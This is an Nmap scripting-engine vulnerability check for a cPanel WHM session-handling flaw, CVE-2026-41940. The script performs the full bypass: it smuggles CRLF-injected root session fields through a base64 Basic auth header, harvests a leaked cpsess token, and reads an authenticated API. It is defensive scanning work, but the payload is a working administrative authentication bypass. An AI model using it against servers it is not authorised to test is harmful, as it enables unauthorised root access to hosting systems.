description = [[
Detects cPanel WebHost Manager (WHM) installs that appear vulnerable to
CVE-2026-41940. The check follows the multi-step authenticated-session test
against the WHM web interface exposed on HTTPS (commonly TCP/2087): resolution
of the canonical hostname, creation of an unprivileged session cookie,
injection probe via crafted HTTP Basic authentication, denial of that session
triggering cache propagation, and finally retrieval of authenticated API JSON
using the manipulated session cookie.

References:
* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-41940

This script intentionally mirrors publicly described verification behaviour;
it confirms the flawed session handling sequence but does not perform
post-auth actions beyond reading the documented version API probe response.
]]

---
-- @usage nmap -p2087 --script http-vuln-cve2026-41940 <target>
-- @usage nmap -sV -p2086,2087,2096 --script http-vuln-cve2026-41940 <target>
--
-- @output
-- PORT     STATE SERVICE
-- 2087/tcp open  ssl/https
-- | http-vuln-cve2026-41940:
-- |   VULNERABLE:
-- |   CVE-2026-41940 cPanel WHM session handling flaw
-- |     State: VULNERABLE
-- |     IDs:  CVE:CVE-2026-41940
-- |
-- |_    References:
-- |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-41940
--
-- @args http-vuln-cve2026-41940.timeout Socket timeout per HTTP operation in milliseconds (default 15000).
-- @args http-vuln-cve2026-41940.canonical Explicit canonical hostname for Host header probing (normally taken from Location on /openid_connect/cpanelid).
---

author = "Sercan Okur"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"intrusive", "vuln", "auth"}

local base64 = require "base64"
local http = require "http"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"
local url = require "url"
local vulns = require "vulns"

local AUTH_PAYLOAD_YEARS = 10 * 365 * 24 * 3600

portrule = shortport.portnumber({2086, 2087, 2096}, "tcp")

local function build_basic_payload()
  local ts = os.time() + AUTH_PAYLOAD_YEARS
  local raw = string.format(
    "root:x\r\nsuccessful_internal_auth_with_timestamp=%d\r\nuser=root\r\ntfa_verified=1\r\nhasroot=1",
    ts
  )
  return base64.enc(raw)
end

local function with_host_header(opts, canon, portnum)
  local o = opts or {}
  if not canon then
    return o
  end
  local h = {}
  if o.header then
    for k, v in pairs(o.header) do
      h[k] = v
    end
  end
  h.Host = ("%s:%d"):format(canon, portnum)
  o.header = h
  return o
end

local function canon_from_location(location)
  if not location or location == "" then
    return nil
  end
  return location:match("^https?://([^:/]+)")
end

---
-- Extracts session material from whostmgrsession Set-Cookie, matching behaviour
-- of URL-unquoting followed by splitting on first comma only.
--
local function whostmgrsession_base(resp)
  if not resp or not resp.cookies then
    return nil
  end
  for _, ck in ipairs(resp.cookies) do
    if ck.name == "whostmgrsession" then
      local v = url.unescape(ck.value)
      local base = v:match("^([^,]+)") or v
      return base
    end
  end
  return nil
end

---
-- Cookie header transport encoding uses application/x-www-form-urlencoded bytes.
--
local function cookie_esc(s)
  return url.escape(s)
end

---
-- Returns canonical hostname string or nil plus error message.
--
local function find_canonical(host, port, timeout, canon_arg)
  if canon_arg and canon_arg ~= "" then
    return canon_arg, nil
  end
  local opts = with_host_header({
    redirect_ok = false,
    no_cache = true,
    timeout = timeout,
    header = { ["User-Agent"] = "CVE-2026-41940-checker/0.1" },
  }, nil)
  local r = http.get(host, port, "/openid_connect/cpanelid", opts)
  if not r or not r.header then
    return nil, "no response probing /openid_connect/cpanelid"
  end
  local loc = r.header["location"]
  local c = canon_from_location(loc)
  if not c then
    c = host.targetname or host.name or host.ip
  end
  return c
end

local function fetch_session(host, port, canon, timeout)
  local opts = with_host_header({
    redirect_ok = false,
    no_cache = true,
    timeout = timeout,
    header = {
      ["Content-Type"] = "application/x-www-form-urlencoded",
      ["User-Agent"] = "CVE-2026-41940-checker/0.1",
    },
  }, canon, port.number)

  local r = http.post(host, port, "/login/?login_only=1", opts, nil, {
    user = "root",
    pass = "wrong",
  })

  local base = whostmgrsession_base(r)
  if not base then
    local st = r and r.status or "nil"
    return nil, ("failed to obtain whostmgrsession (HTTP %s)"):format(st)
  end
  return cookie_esc(base), nil
end

local function send_injection(host, port, canon, ck_q, payload_basic, timeout)
  local opts = with_host_header({
    redirect_ok = false,
    no_cache = true,
    timeout = timeout,
    header = {
      ["Authorization"] = ("Basic %s"):format(payload_basic),
      ["Cookie"] = ("whostmgrsession=%s"):format(ck_q),
      ["User-Agent"] = "CVE-2026-41940-checker/0.1",
    },
  }, canon, port.number)

  local r = http.get(host, port, "/", opts)
  if not r then
    return nil, "no response on injection probe"
  end

  local loc = r.header and r.header["location"] or ""
  local leaked = loc:match("/cpsess%d%d%d%d%d%d%d%d%d%d")
  if not leaked then
    local st = r.status or "nil"
    return nil, ("injection yielded no leaked cpsess path (HTTP %s)"):format(st)
  end
  return leaked, nil
end

local function activate_cache(host, port, canon, ck_q, timeout)
  local opts = with_host_header({
    redirect_ok = false,
    no_cache = true,
    timeout = timeout,
    header = {
      ["Cookie"] = ("whostmgrsession=%s"):format(ck_q),
      ["User-Agent"] = "CVE-2026-41940-checker/0.1",
    },
  }, canon, port.number)

  local r = http.get(host, port, "/scripts2/listaccts", opts)
  if not r or not r.body then
    return false, "no response on cache activation"
  end
  if r.status ~= "401"
    or (
      not r.body:find("Token denied", 1, true)
      and not r.body:find("WHM Login", 1, true)
    )
  then
    return false, ("cache propagation not as expected (HTTP %s)"):format(r.status or "nil")
  end
  return true, nil
end

local function verify_api(host, port, canon, ck_q, leaked_path, timeout)
  local req_path = ("%s/json-api/version?api.version=1"):format(leaked_path)
  local opts = with_host_header({
    redirect_ok = false,
    no_cache = true,
    timeout = timeout,
    header = {
      ["Cookie"] = ("whostmgrsession=%s"):format(ck_q),
      ["User-Agent"] = "CVE-2026-41940-checker/0.1",
    },
  }, canon, port.number)

  local r = http.get(host, port, req_path, opts)
  if not r or not r.body then
    return false
  end
  local st = tonumber(r.status) or -1

  if st == 200 and r.body:find('"version"', 1, true) then
    return true
  end
  if (st == 500 or st == 503) and r.body:find("License", 1, true) then
    return true
  end

  return false
end

action = function(host, port)
  local timeout = tonumber(stdnse.get_script_args(SCRIPT_NAME .. ".timeout")) or 15000
  local canon_arg = stdnse.get_script_args(SCRIPT_NAME .. ".canonical")

  local vuln = {
    title = "CVE-2026-41940 cPanel WHM session handling flaw",
    state = vulns.STATE.NOT_VULN,
    description = [[
Unauthenticated callers can coax WHM session handling such that manipulated
identifiers grant access surfaces normally guarded by authenticated service
sessions. This script validates the behavioural chain against the HTTPS WHM UI.
]],
    IDS = {
      CVE = "CVE-2026-41940",
    },
    references = {
      "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-41940",
    },
    risk_factor = "High",
    check_results = {},
  }

  local report = vulns.Report:new(SCRIPT_NAME, host, port)

  local canon, cerr = find_canonical(host, port, timeout, canon_arg)
  if not canon then
    vuln.state = vulns.STATE.UNKNOWN
    table.insert(vuln.check_results, cerr or "could not derive canonical hostname")
    return report:make_output(vuln)
  end
  stdnse.debug2("canonical host probe result: %s", canon)

  local ck_q, serr = fetch_session(host, port, canon, timeout)
  if not ck_q then
    vuln.state = vulns.STATE.UNKNOWN
    table.insert(vuln.check_results, serr)
    return report:make_output(vuln)
  end

  local payload_basic = build_basic_payload()
  local leaked, ierr = send_injection(host, port, canon, ck_q, payload_basic, timeout)
  if not leaked then
    table.insert(vuln.check_results, ierr)
    return report:make_output(vuln)
  end

  local ok_cache, cerr2 = activate_cache(host, port, canon, ck_q, timeout)
  if not ok_cache then
    table.insert(vuln.check_results, cerr2)
    return report:make_output(vuln)
  end

  if verify_api(host, port, canon, ck_q, leaked, timeout) then
    vuln.state = vulns.STATE.VULN
    vuln.extra_info = { ("Leak path prefix: %s"):format(leaked) }
    return report:make_output(vuln)
  end

  table.insert(vuln.check_results, "version API probe did not confirm vulnerability")
  return report:make_output(vuln)
end
